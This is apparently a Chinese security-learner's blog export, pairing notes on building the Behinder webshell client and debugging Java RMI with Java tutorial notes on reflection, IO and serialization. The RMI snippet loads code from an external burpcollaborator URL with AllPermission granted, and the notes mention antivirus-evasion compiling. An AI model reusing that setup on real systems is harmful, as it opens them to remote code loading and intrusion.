默认是取用系统环境变量，我本机主要还是java11，而com.sun的那个包在java8下面，所以我改成了绝对路径\nidea虽然可以自动解决maven依赖缺失问题，但是可能会由于烂网导致某个依赖下载一半留下一堆sha1, part文件却没有主体jar，只需要把这个依赖的主文件夹删掉，再maven reload即可重新下载 其它问题就没有了，直接maven package即可得到目标jar\n还有部分包的问题，可以省事都改成\u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt;，有依赖会好些\nnet.rebeyond.behinder.dao.ShellManager#ShellManager()的DB_PATH修改为./data.db，把资源文件中的data.db放入target下 和最后的jar包同目录即可\nidea在build项目时报错 internal java compiler error 有以下几个需要排错的地方\nProject Structure Settings pom.xml java rmi调试报错解决 亲测用-D方式添加参数没用（可能是我本地环境太垃圾了 破win10）\nSystem.setProperty(\u0026#34;java.rmi.server.useCodebaseOnly\u0026#34;,\u0026#34;false\u0026#34;); System.setProperty(\u0026#34;java.security.policy\u0026#34;,\u0026#34;E:\\\\client.policy\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.codebase\u0026#34;,\u0026#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/\u0026#34;); if(System.getSecurityManager() == null){ System.out.println(\u0026#34;Setup SecurityManager...\u0026#34;); System.setSecurityManager(new SecurityManager()); } grant { permission java.security.AllPermission; }; 参考：https://coderanch.com/t/654168/java/java-security-AccessControlException-access-denied\nwindows\u0026#43;vscode使用gmp库(静态库) 下载gmp，msys2，修改msys的pacman的源\n# msys2.exe pacman -Sy\t# 刷新软件包数据 pacman -S mingw-w64-x86_64-toolchain\t# 安装64位mingw # mingw64.exe pacman -Ss msys/gcc pacman -Ss msys/make cd D:/gmp\t# 以下步骤并不会特别耗时 半个小时内应该就可 ./configure\tmake make check make install 生成的静态库文件在gmp内的.libs目录下，使用时\n#include \u0026lt;D:/gmp-6.2.1/gmp.h\u0026gt; 在vscode的tasks.json中添加这样的参数\n\u0026#34;-I\u0026#34;, \u0026#34;D:\\\\gmp-6.2.1\u0026#34;, // gmp.h所在文件夹 \u0026#34;-L\u0026#34;, \u0026#34;D:\\\\gmp-6.2.1\\\\.libs\u0026#34;, // .libs文件夹路径 静态库所在处 \u0026#34;-l\u0026#34;, \u0026#34;gmp\u0026#34; // 表示libgmp.a库 继续f5即可（因为我是把f5当编译用的 runcode不行 f5行（（（\n————最后吐槽一下windows上编译c程序的繁琐问题（仅针对vscode 没用过vc）。最开始学c的时候顺着python用vscode的习惯就想着用vscode写c，然后根据教程配好了环境：下载MinGW、配置.vscode的调试信息、下载vscode的相关插件，终于写出了hello word，但是之后问题也没断过，比如大家都清楚的控制台gbk和utf-8，以及chcp 65001和chcp 936的永恒之争，最后我妥协的方式是把所有的c文件编码格式设为gbk，同时将调试参数改为-finput-charset=GBK -fexec-charset=GBK；第二个问题就是MinGW64这个坑货了，当时安装时我完全没注意到还有很多选项，直接zip解压的\ngcc version 8.1.0 (x86_64-posix-seh-rev0, Built by MinGW-W64 project) 后来做免杀发现寄了，这个seh的版本不能编译32位的文件，即使加了-m32也不行，草，妈的。我当时不想再破坏主机的环境，所以在虚拟机装了sjlj版的，终于可以用-m32了\n再然后就是现在，为了用gmp库我还得借助msys，用它的make，那你MinGW的cmake是干什么吃的？？？？？\n而且，而且，mysys下通过pacman安装的MinGW64也无法正确编译32位程序\n最后的解决方法是把sjlj版的直接覆盖掉我用不到的MinGW32文件夹里，然后实现了顺滑的-m32\n总之。还是。非常无语。\n","date":"2022-03-17T10:58:56+08:00","permalink":"https://amiaaaz.github.io/2022/03/17/maybe-help-someone/","section":"posts","tags":[],"title":"环境配置\u0026相关问题解决"},{"categories":["NOTES\u0026SUMMARY"],"contents":"并非Java开发要掌握的全部语法，我挑着来的（提前声明\n还是廖大的Java教程\n反射 反射Reflection可以在程序运行期，对某个实例一无所知的情况下 拿到一个对象的所有信息，调用其方法\n是十分强大的语言武器\nClass\u0026amp;动态加载 class由JVM在执行过程中动态加载，JVM第一次读取到一种class类型时 将其加载入内存（不遇到不会预先加载，利用这一点可以做到运行期根据条件加载不同的实现类），每加载一种class，JVM就为其创建一个Class类型的实例 并与其关联起来 // class类型: 名叫Class的class public final class Class{ private Class(){} } 以String类为例，当JVM加载String类时，它首先读取String.class入内存，然后为String类创建一个Class实例并关联起来\nClass cls = new Class(String); 这个Class实例的构造方法为private，只有JVM可以创建\nJVM持有的每个Class实例都指向一个数据类型(class or interface) 一个Class实例包含了该class的所有信息，所以如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息，这就叫反射Reflection 获取一个class的Class实例的三种方法 // 通过一个class的静态变量class获取 // 已经加载某个类 获取它的java.lang.Class对象 Class cls = String.class; // 通过实例变量的getClass方法获取 // 上下文已存在某个类的实例 String s = \u0026#34;Hello\u0026#34;; Class cls = s.getClass(); // 通过静态方法Class.forName获取 // 前提是知道class的完整类名 Class cls = Class.forName(\u0026#34;java.lang.String\u0026#34;); 因为Class实例在JVM中是唯一的，所以上述方法获取的Class实例是同一个实例，可以用==比较 一般应该用instanceof判断数据类型，不但匹配指定类型，还匹配指定类型的子类；而用==判断class实例可以精确地判断数据类型，但不能作子类型比较 Integer n = new Integer(123); boolean b1 = n instanceof Integer; // true，因为n是Integer类型 boolean b2 = n instanceof Number; // true，因为n是Number类型的子类 boolean b3 = n.getClass() == Integer.class; // true，因为n.getClass()返回Integer.class boolean b4 = n.getClass() == Number.class; // false，因为Integer.class!=Number.class 通过反射获取实例的基本信息的小栗子 public class Main { public static void main(String[] args) {\t// 注 printClassInfo(\u0026#34;\u0026#34;.getClass()); printClassInfo(Runnable.class); printClassInfo(java.time.Month.class); printClassInfo(String[].class); printClassInfo(int.class); } static void printClassInfo(Class cls) { System.out.println(\u0026#34;Class name: \u0026#34; + cls.getName()); System.out.println(\u0026#34;Simple name: \u0026#34; + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\u0026#34;Package name: \u0026#34; + cls.getPackage().getName()); } System.out.println(\u0026#34;is interface: \u0026#34; + cls.isInterface()); System.out.println(\u0026#34;is enum: \u0026#34; + cls.isEnum()); System.out.println(\u0026#34;is array: \u0026#34; + cls.isArray()); System.out.println(\u0026#34;is primitive: \u0026#34; + cls.isPrimitive()); } } String[]也是一种类，不同于String.class，它的类名是[Ljava.lang.String;\n每一种基本类型对应的Class实例可以用基本类型.class访问\n获取到Class实例后可以用它来创建对应类型的实例，与直接new的相比，局限在于只能调用public的无参数构造方法，而有参数的构造方法 或非public的构造方法都无法通过Class.newInstance()调用\nClass cls = String.class; String s = (String) cls.newInstance(); // 相当于 new String() 访问字段 Class类提供了以下几个方法来获取字段的（返回Field对象 public class Main { public static void main(String[] args) throws Exception { Class stdClass = Student.class; // 根据字段名获取某个public的field(包括父类) System.out.println(stdClass.getField(\u0026#34;score\u0026#34;));\t// 获取public字段\u0026#34;score\u0026#34; System.out.println(stdClass.getField(\u0026#34;name\u0026#34;));\t// 获取继承的public字段\u0026#34;name\u0026#34; // 根据字段名获取当前类的某个field(不包括父类) System.out.println(stdClass.getDeclaredField(\u0026#34;grade\u0026#34;));\t// 获取private字段\u0026#34;grade\u0026#34; } } class Student extends Person { public int score; private int grade; } class Person { public String name; } 一个Field对象包含一个字段的所有信息 Field f = String.class.getDeclaredField(\u0026#34;value\u0026#34;); // 返回字段名称 f.getName(); // \u0026#34;value\u0026#34; // 返回字段类型 是一个Class实例(比如String.class) f.getType(); // class [B 表示byte[]类型 // 返回字段的修饰符 是一个int 不同的bit有不同的含义 int m = f.getModifiers(); Modifier.isFinal(m); // true Modifier.isPublic(m); // false Modifier.isProtected(m); // false Modifier.isPrivate(m); // true Modifier.isStatic(m); // false 用Field.get(Object)可以获取指定实例指定字段的值；如果字段为private可以调用Field.setAccessible(true)，一律访问，可能会失败的原因是JVM运行期SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，保护JVM核心库的安全 同样的，用Field.set(Object, Object)可以设置字段的值，第一个Object参数是指定的实例，第二个Object参数是待修改的值 import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { Person p = new Person(\u0026#34;Xiao Ming\u0026#34;); System.out.println(p.getName()); // \u0026#34;Xiao Ming\u0026#34; Class c = p.getClass(); Field f = c.getDeclaredField(\u0026#34;name\u0026#34;); f.setAccessible(true);\t// 修改非public字段 f.set(p, \u0026#34;Xiao Hong\u0026#34;); System.out.println(p.getName()); // \u0026#34;Xiao Hong\u0026#34; } } class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return this.name; } } 调用方法 Class类提供了以下几个方法来获取方法的（返回Method对象 public class Main { public static void main(String[] args) throws Exception { Class stdClass = Student.class; // 获取某个public的Method(包括父类) System.out.println(stdClass.getMethod(\u0026#34;getScore\u0026#34;, String.class));\t// 获取public方法getScore，参数为String System.out.println(stdClass.getMethod(\u0026#34;getName\u0026#34;));\t// 获取继承的public方法getName，无参数 // 获取当前类的某个Method(不包括父类) System.out.println(stdClass.getDeclaredMethod(\u0026#34;getGrade\u0026#34;, int.class));\t// 获取private方法getGrade，参数为int } } class Student extends Person { public int getScore(String type) { return 99; } private int getGrade(int year) { return 1; } } class Person { public String getName() { return \u0026#34;Person\u0026#34;; } } 一个Method对象包含一个方法的所有信息，函数基本同上一个三级标题 得到Method后我们可以对他进行调用，方式是调用其invoke，第一个参数是对象实例，后面为可变参数，与方法参数一致 import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { String s = \u0026#34;Hello world\u0026#34;;\t// String对象 Method m = String.class.getMethod(\u0026#34;substring\u0026#34;, int.class);\t// 获取String substring(int) String r = (String) m.invoke(s, 6);\t// 调用 System.out.println(r); } } 值得注意的是，substring自身有两个重载方法，我们获取的是其中的substring(int)这个方法\n如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以invoke方法传入的第一个参数永远为null import java.lang.reflect.Method; public class Main{ public static void main(String[] args) Method m = Integer.class.getMethod(\u0026#34;parseInt\u0026#34;, String.class);\t// 获取Integer.parseInt(String) Integer n = (Integer) m.invoke(null, \u0026#34;12345\u0026#34;);\t// 调用 System.out.println(n); } 同上一个三级标题对于private字段的处理，我们可以用Method.setAccessible(true)，也存在同样可能失败的原因，不重复了 import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { Person p = new Person(); Method m = p.getClass().getDeclaredMethod(\u0026#34;setName\u0026#34;, String.class); m.setAccessible(true); m.invoke(p, \u0026#34;Bob\u0026#34;); System.out.println(p.name); } } class Person { String name; private void setName(String name) { this.name = name; } } 对于参数不同的方法 我们可以指定参数类型和数量，而对于多态，仍表现出多态的原则，即 总是调用实际类型的覆写方法（如果存在 import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { Method h = Person.class.getMethod(\u0026#34;hello\u0026#34;); h.invoke(new Student()); /** 相当于 Person p = new Student(); p.hello(); */ } } class Person { public void hello() { System.out.println(\u0026#34;Person:hello\u0026#34;); } } class Student extends Person { public void hello() {\t// 继承自Person 覆写hello方法 System.out.println(\u0026#34;Student:hello\u0026#34;); } } 调用构造方法 正常的new会触发构造方法，通过class的new会有局限性（见上），为了调用任意的构造方法，我们可以使用反射的Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例；Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例 import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception { // 获取某个public的Constructor Constructor cons1 = Integer.class.getConstructor(int.class);\t// 获取构造方法Integer(int) Integer n1 = (Integer) cons1.newInstance(123);\t// 调用构造方法 System.out.println(n1); Constructor cons2 = Integer.class.getConstructor(String.class);\t// 获取构造方法Integer(String) Integer n2 = (Integer) cons2.newInstance(\u0026#34;456\u0026#34;); System.out.println(n2); } } 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题 同上面，可以有setAccessible(true)来调用非public的Constructor 获取继承关系 最开始的三级标题Class中提到了三种方式获取Class实例，他们都是同一个实例，因为JVM对每个加载的Class只创建一个Class实例来表示它的类型 获取父类Class public class Main { public static void main(String[] args) throws Exception { Class i = Integer.class; Class n = i.getSuperclass(); System.out.println(n); Class o = n.getSuperclass(); System.out.println(o); System.out.println(o.getSuperclass()); } } 获取接口，getInterfaces只返回当前类直接实现的接口类型，不包括父类；如果一个类没有实现任何interface，那么getInterfaces返回空数组 import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { Class s = Integer.class; Class[] is = s.getInterfaces(); for (Class i : is) { System.out.println(i); } } } 当我们判断一个实例是否是某个类型时，正常情况下使用instanceof Object n = Integer.valueOf(123); boolean isDouble = n instanceof Double; // false boolean isInteger = n instanceof Integer; // true boolean isNumber = n instanceof Number; // true boolean isSerializable = n instanceof java.io.Serializable; // true 如果是两个Class实例，要判断一个向上转型是否成立，可以调用isAssignableFrom() // Integer i = ? Integer.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Integer // Number n = ? Number.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Number // Object o = ? Object.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Object // Integer i = ? Integer.class.isAssignableFrom(Number.class); // false，因为Number不能赋值给Integer 动态代理 class可以实例化而interface不可以，所有interface类型的变量总是通过某个实例向上转型并赋值给接口类型变量 CharSequence cs = new StringBuilder(); 静态方式 // 定义接口 public interface Hellp{ void morning(String name); } // 编写实现类 public class HelloWorld implements Hellp{ public void morning(String name){ System.out.println(\u0026#34;Good morning, \u0026#34; + name); } } // 创建实例 转型为接口并调用 Hello hello = new HelloWorld(); hello.morning(\u0026#34;Bob\u0026#34;); 动态代理Dynamic Proxy可以在运行期动态创建某个interface的实例，不编写实现类，直接通过Proxy.newProxyInstance()创建一个Hello接口对象 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class Main { public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() {\t// InvocationHandler实例负责实现接口的方法调用 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); if(method.getName().equals(\u0026#34;morning\u0026#34;)){ System.out.println(\u0026#34;Good mornig, \u0026#34; + args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(\t// 返回的Object强制转型为接口 Hello.class.getClassLoader(),\t// 使用的ClassLoader 通常为接口类的ClassLoader new Class[]{Hello.class},\t// 需要实现的接口数组 至少传入一个接口 handler);\t// 用来处理接口方法调用的InvocationHandler实例 hello.morning(\u0026#34;Bob\u0026#34;); } } interface Hello{ void morning(String name); } 动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，上面的改写为静态实现是这样的 public class HelloDynamicProxy implements Hello{ InvationHandler handler; public HelloDynamicProxy(InvocationHandler handler){ this.handler = handler; } public void morning(String name){ handler.invoke{ this, Hello.class.getMethod(\u0026#34;morning\u0026#34;, String.class), new Object[]{name}; } } } 只不过JVM直接编写了这个中间的类，不需要源码，可以直接生成字节码\n注解 注解Annotation，是放在Java源码的类、方法、字段、参数前的一种特殊注释\n使用\u0026amp;定义注解 注解可分为三类\n1 编译器使用的注解：这类注解不会被编译进入.class文件，它们在编译后就被编译器扔掉了 @Override：让编译器检查该方法是否正确地实现了覆写\n@SuppressWarnings：告诉编译器忽略此处代码产生的警告\n2 由工具处理.class文件使用的注解：有些工具会在加载class的时候，对class做动态修改，实现一些特殊的功能；这类注解会被编译进入.class文件，但加载结束后并不会存在于内存中 3 程序运行期可读取的注解：加载后一直存在于JVM中，这也是最常用的注解 @PostConstruct：配置了它的方法会在调用构造方法后自动被调用，这是Java代码读取该注解实现的功能，JVM并不会识别该注解\n定义一个注解时，还可以定义配置参数，配置参数可以包括：基本类型，String，枚举类，基本类型、String、Class以及枚举的数组；可以设置缺省值，如果只写注解，相当于全部使用默认值 public class Hello { @Check(min=0, max=100, value=55) public int n; @Check(value=99) public int p; @Check(99) // @Check(value=99) public int x; @Check public int y; } @Check就是一个注解\n有一些注解可以修饰其他注解，这些注解就称为元注解Meta annotation @Target：使用@Target可以定义Annotation能够被应用于源码的哪些位置\n类或接口：ElementType.TYPE 字段：ElementType.FIELD 方法：ElementType.METHOD 构造方法：ElementType.CONSTRUCTOR 方法参数：ElementType.PARAMETER @Retention：定义了Annotation的生命周期，通常我们自定义的Annotation都是RUNTIME\n仅编译期：RetentionPolicy.SOURCE\t编译器被丢掉 一般不用(编译器使用) 仅class文件：RetentionPolicy.CLASS\t仅保存在class文件中 不会被加载入JVM(底层工具库使用 涉及class的加载) 运行期：RetentionPolicy.RUNTIME\t会被加载进JVM 并在运行期被程序读取(常用) @Repeatable：定义Annotation是否可重复\n@Inherited：定义子类是否可继承父类定义的Annotatio，仅针对@Target(ElementType.TYPE)类型的annotation有效，并且仅针对class的继承，对interface的继承无效\n使用@interface语法来定义注解，用元注释来配置注释，其中@Target和@Retention(一般设为RUNTIME)必须设置 @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) public @interface Report { int type() default 0; String level() default \u0026#34;info\u0026#34;; String value() default \u0026#34;\u0026#34;; } 处理注解 注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定\n注解定义后也是一种class，所有的注解都继承自java.lang.annotation.Annotation，所以读取注解需要用到反射\n判断某个注解是否存在于Class、Field、Method或Constructor：\nClass.isAnnotationPresent(Class) Field.isAnnotationPresent(Class) Method.isAnnotationPresent(Class) Constructor.isAnnotationPresent(Class) // 判断@Report是否存在于Person类: Person.class.isAnnotationPresent(Report.class); 反射API读取Annotation：\nClass.getAnnotation(Class) Field.getAnnotation(Class) Method.getAnnotation(Class) Constructor.getAnnotation(Class) // 获取Person定义的@Report注解: Report report = Person.class.getAnnotation(Report.class); int type = report.type(); String level = report.level(); 使用反射API读取Annotation有两种方法。方法一是先判断Annotation是否存在，如果存在，就直接读取：\nClass cls = Person.class; if (cls.isAnnotationPresent(Report.class)) { Report report = cls.getAnnotation(Report.class); ... } 第二种方法是直接读取Annotation，如果Annotation不存在，将返回null：\nClass cls = Person.class; Report report = cls.getAnnotation(Report.class); if (report != null) { ... } 读取方法、字段和构造方法的Annotation和Class类似。但要读取方法参数的Annotation就比较麻烦一点，因为方法参数本身可以看成一个数组，而每个参数又可以定义多个注解，所以，一次获取方法参数的所有注解就必须用一个二维数组来表示。例如，对于以下方法定义的注解：\npublic void hello(@NotNull @Range(max=5) String name, @NotNull String prefix) { } 要读取方法参数的注解，我们先用反射获取Method实例，然后读取方法参数的所有注解：\n// 获取Method实例: Method m = ... // 获取所有参数的Annotation: Annotation[][] annos = m.getParameterAnnotations(); // 第一个参数（索引为0）的所有Annotation: Annotation[] annosOfName = annos[0]; for (Annotation anno : annosOfName) { if (anno instanceof Range) { // @Range注解 Range r = (Range) anno; } if (anno instanceof NotNull) { // @NotNull注解 NotNull n = (NotNull) anno; } } 定义了注解，本身对程序逻辑没有任何影响，必须自己编写代码来使用注解\n@Retention(RetentionPolicy.RUNTIME) @Target(ElementType.FIELD) public @interface Range { int min() default 0; int max() default 255; } void check(Person person) throws IllegalArgumentException, ReflectiveOperationException { // 遍历所有Field: for (Field field : person.getClass().getFields()) { // 获取Field定义的@Range: Range range = field.getAnnotation(Range.class); // 如果@Range存在: if (range != null) { // 获取Field的值: Object value = field.get(person); // 如果值是String: if (value instanceof String) { String s = (String) value; // 判断值是否满足@Range的min/max: if (s.length() \u0026lt; range.min() || s.length() \u0026gt; range.max()) { throw new IllegalArgumentException(\u0026#34;Invalid field: \u0026#34; + field.getName()); } } } } } 这样一来，我们通过@Range注解，配合check()方法，就可以完成Person实例的检查。注意检查逻辑完全是我们自己编写的，JVM不会自动给注解添加任何额外的逻辑。\nIO File\u0026amp;Path 标准库java.io提供File对象来操作文件和目录，可以传入绝对路径和相对路径；即使传入的不存在也不报错，可以用isFile, isDirectory进行检查 File对象既可以表示文件，也可以表示目录，可以用getPath(传入路径), getAbsolutePath(绝对路径), getCanonicalPath(规范路径) 当File对象表示一个目录时，可以使用list()和listFiles()列出目录下的文件和子目录名，listFiles()提供了一系列重载方法，可以过滤不想要的文件和目录 import java.io.*; public class Main { public static void main(String[] args) throws IOException { File f = new File(\u0026#34;C:\\\\Windows\u0026#34;); File[] fs1 = f.listFiles(); // 列出所有文件和子目录 printFiles(fs1); File[] fs2 = f.listFiles(new FilenameFilter() { // 仅列出.exe文件 public boolean accept(File dir, String name) { return name.endsWith(\u0026#34;.exe\u0026#34;); // 返回true表示接受该文件 } }); printFiles(fs2); } static void printFiles(File[] files) { System.out.println(\u0026#34;==========\u0026#34;); if (files != null) { for (File f : files) { System.out.println(f); } } System.out.println(\u0026#34;==========\u0026#34;); } } 其它API boolean canRead()：是否可读 boolean canWrite()：是否可写 boolean canExecute()：是否可执行 long length()：文件字节大小 boolean mkdir()：创建当前File对象表示的目录 boolean mkdirs()：创建当前File对象表示的目录，并在必要时将不存在的父目录也创建出来 boolean delete()：删除当前File对象表示的目录，当前目录必须为空才能删除成功 可以用createTempFile()来创建一个临时文件，以及deleteOnExit()在JVM退出时自动删除该文件 import java.io.*; public class Main { public static void main(String[] args) throws IOException { File f = File.createTempFile(\u0026#34;tmp-\u0026#34;, \u0026#34;.txt\u0026#34;); // 提供临时文件的前缀和后缀 f.deleteOnExit(); // JVM退出时自动删除 System.out.println(f.isFile()); System.out.println(f.getAbsolutePath()); } } Path对象位于java.nio.file包，和File对象类似，但操作更加简单，便于操作目录的拼接、遍历等 import java.io.*; import java.nio.file.*; public class Main { public static void main(String[] args) throws IOException { Path p1 = Paths.get(\u0026#34;.\u0026#34;, \u0026#34;project\u0026#34;, \u0026#34;study\u0026#34;); // 构造一个Path对象 System.out.println(p1); Path p2 = p1.toAbsolutePath(); // 转换为绝对路径 System.out.println(p2); Path p3 = p2.normalize(); // 转换为规范路径 System.out.println(p3); File f = p3.toFile(); // 转换为File对象 System.out.println(f); for (Path p : Paths.get(\u0026#34;..\u0026#34;).toAbsolutePath()) { // 可以直接遍历Path System.out.println(\u0026#34; \u0026#34; + p); } } } Files\u0026amp;Paths 是java.nio包里面的类，封装了很多读写文件的简单方法\n// 把一个文件的全部内容读取为一个byte[] byte[] data = Files.readAllBytes(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;)); // 把一个文件的全部内容读取为String // 默认使用UTF-8编码读取: String content1 = Files.readString(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;)); // 可指定编码: String content2 = Files.readString(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), StandardCharsets.ISO_8859_1); // 按行读取并返回每行内容: List\u0026lt;String\u0026gt; lines = Files.readAllLines(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;)); // 写入文件 // 写入二进制文件: byte[] data = ... Files.write(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), data); // 写入文本并指定编码: Files.writeString(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), \u0026#34;文本内容...\u0026#34;, StandardCharsets.ISO_8859_1); // 按行写入文本: List\u0026lt;String\u0026gt; lines = ... Files.write(Paths.get(\u0026#34;/path/to/file.txt\u0026#34;), lines); 注意，Files提供的读写方法，受内存限制，只能读写小文件，例如配置文件等，不可一次读入几个G的大文件。读写大型文件仍然要使用文件流，每次只读写一部分文件内容\n字节流读写 InputStream代表输入字节流，OuputStream代表输出字节流，以byte为最小单位\nReader和Writer表示字符流(读写字符，并且字符不全是单字节表示的ASCII字符)，以char为最小单位\n如果数据源不是文本，就只能使用InputStream，如果数据源是文本，使用Reader更方便一些\nInputStream并不是一个接口，而是一个抽象类，它是所有输入流的超类，这个抽象类定义的一个最重要的方法就是int read()\npublic abstract int read() throws IOException; 这个方法会读取输入流的下一个字节，并返回字节表示的int值（0~255），如果已读到末尾，返回-1表示不能继续读取了\nFileInputStream是InputStream的一个子类，从文件流中读取数据 public void readFile() throws IOException{ InputStream input = new FileInputStream(\u0026#34;src/readme.md\u0026#34;); for(;;){ int n = input.read(); if(n == -1){ break; } System.out.println(n); } input.close(); } 所有与IO操作相关的代码都必须正确处理IOException，可以用try ... finally来保证InputStream在无论是否发生IO错误的时候都能够正确地关闭 public void readFile() throws IOException{ InputStream input = null; try{ input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;); int n; while((n = input.read())!=-1){ System.out.prinln(n); } }finally{ if(input!=null){ input.close(); } } } java7之后可以用更简单的try(resource) public void readFile() throws IOException { try (InputStream input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;)) { int n; while ((n = input.read()) != -1) { System.out.println(n); } } // 编译器在此自动为我们写入finally并调用close() } 实际上，编译器并不会特别地为InputStream加上自动关闭。编译器只看try(resource = ...)中的对象是否实现了java.lang.AutoCloseable接口，如果实现了，就自动加上finally语句并调用close()方法。InputStream和OutputStream都实现了这个接口，因此都可以用在try(resource)中\nInputStream提供了两个重载方法来支持读取多个字节 int read(byte[] b)：读取若干字节并填充到byte[]数组，返回读取的字节数 int read(byte[] b, int off, int len)：指定byte[]数组的偏移量和最大填充数 利用上述方法一次读取多个字节时，需要先定义一个byte[]数组作为缓冲区，read()方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。read()方法的返回值不再是字节的int值，而是返回实际读取了多少个字节。如果返回-1，表示没有更多的数据了\n利用缓冲区一次读取多个字节的代码如下：\npublic void readFile() throws IOException { try (InputStream input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;)) { // 定义1000个字节大小的缓冲区: byte[] buffer = new byte[1000]; int n; while ((n = input.read(buffer)) != -1) { // 读取到缓冲区 System.out.println(\u0026#34;read \u0026#34; + n + \u0026#34; bytes.\u0026#34;); } } } 除FileInputStream以外还有ByteArrayInputStream可以在内存中模拟一个InputStream，实际上是把一个byte[]数组在内存中变成一个InputStream import java.io.*; public class Main { public static void main(String[] args) throws IOException { byte[] data = { 72, 101, 108, 108, 111, 33 }; try (InputStream input = new ByteArrayInputStream(data)) { int n; while ((n = input.read()) != -1) { System.out.println((char)n); } } } } OutputStream还提供了一个flush()方法，它的目的是将缓冲区的内容真正输出到目的地 字符流读写 InputStream Reader 字节流，以byte为单位 字符流，以char为单位 读取字节（-1，0~255）：int read() 读取字符（-1，0~65535）：int read() 读到字节数组：int read(byte[] b) 读到字符数组：int read(char[] c) 除了特殊的CharArrayReader和StringReader，普通的Reader实际上是基于InputStream构造的，因为Reader需要从InputStream中读入字节流（byte），然后，根据编码设置，再转换为char就可以实现字符流。如果我们查看FileReader的源码，它在内部实际上持有一个FileInputStream。\n既然Reader本质上是一个基于InputStream的byte到char的转换器，那么，如果我们已经有一个InputStream，想把它转换为Reader，是完全可行的。InputStreamReader就是这样一个转换器，它可以把任何InputStream转换为Reader。示例代码如下：\n// 持有InputStream: InputStream input = new FileInputStream(\u0026#34;src/readme.txt\u0026#34;); // 变换为Reader: Reader reader = new InputStreamReader(input, \u0026#34;UTF-8\u0026#34;); 构造InputStreamReader时，我们需要传入InputStream，还需要指定编码，就可以得到一个Reader对象。上述代码可以通过try (resource)更简洁地改写如下：\ntry (Reader reader = new InputStreamReader(new FileInputStream(\u0026#34;src/readme.txt\u0026#34;), \u0026#34;UTF-8\u0026#34;)) { // TODO: } 上述代码实际上就是FileReader的一种实现方式。\n使用try (resource)结构时，当我们关闭Reader时，它会在内部自动调用InputStream的close()方法，所以，只需要关闭最外层的Reader对象即可\nOutputStream Writer 字节流，以byte为单位 字符流，以char为单位 写入字节（0~255）：void write(int b) 写入字符（0~65535）：void write(int c) 写入字节数组：void write(byte[] b) 写入字符数组：void write(char[] c) 无对应方法 写入String：void write(String s) 除了CharArrayWriter和StringWriter外，普通的Writer实际上是基于OutputStream构造的，它接收char，然后在内部自动转换成一个或多个byte，并写入OutputStream。因此，OutputStreamWriter就是一个将任意的OutputStream转换为Writer的转换器：\ntry (Writer writer = new OutputStreamWriter(new FileOutputStream(\u0026#34;readme.txt\u0026#34;), \u0026#34;UTF-8\u0026#34;)) { // TODO: } 上述代码实际上就是FileWriter的一种实现方式，这和上面的InputStreamReader是一样的\nFilter模式 Filter模式可以在运行期动态增加功能，又称Decorator模式\nclasspath 从classpath读取文件就可以避免不同环境下文件路径不一致的问题，在classpath中的资源文件，路径总是以／开头，我们先获取当前的Class对象，然后调用getResourceAsStream()就可以直接从classpath读取任意的资源文件：\ntry (InputStream input = getClass().getResourceAsStream(\u0026#34;/default.properties\u0026#34;)) { // TODO: } 调用getResourceAsStream()需要特别注意的一点是，如果资源文件不存在，它将返回null。因此，我们需要检查返回的InputStream是否为null，如果为null，表示资源文件在classpath中没有找到：\ntry (InputStream input = getClass().getResourceAsStream(\u0026#34;/default.properties\u0026#34;)) { if (input != null) { // TODO: } } 如果我们把默认的配置放到jar包中，再从外部文件系统读取一个可选的配置文件，就可以做到既有默认的配置文件，又可以让用户自己修改配置：\nProperties props = new Properties(); props.load(inputStreamFromClassPath(\u0026#34;/default.properties\u0026#34;)); props.load(inputStreamFromFile(\u0026#34;./conf.properties\u0026#34;)); 这样读取配置文件，应用程序启动就更加灵活\n序列化\u0026amp;反序列化 序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组\n一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口(标记接口Marker Interface)\npublic interface Serializable{ } 反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行（同PHP），可设置serialVersionUID作为版本号\npublic class Person implements Serializable { private static final long serialVersionUID = 2709425275741743919L; } 可以避免class定义变动导致的不兼容，通常可以由IDE自动生成\n网络编程 Socket - TCP 一个Socket就是由ip和port构成，Socket编程就是指两个进程之间的网络通信，Server\u0026amp;Client\n// Server.java import java.io.*; import java.net.ServerSocket; import java.net.Socket; import java.nio.charset.StandardCharsets; public class Server { public static void main(String[] args) throws IOException{ ServerSocket ss = new ServerSocket(6980); 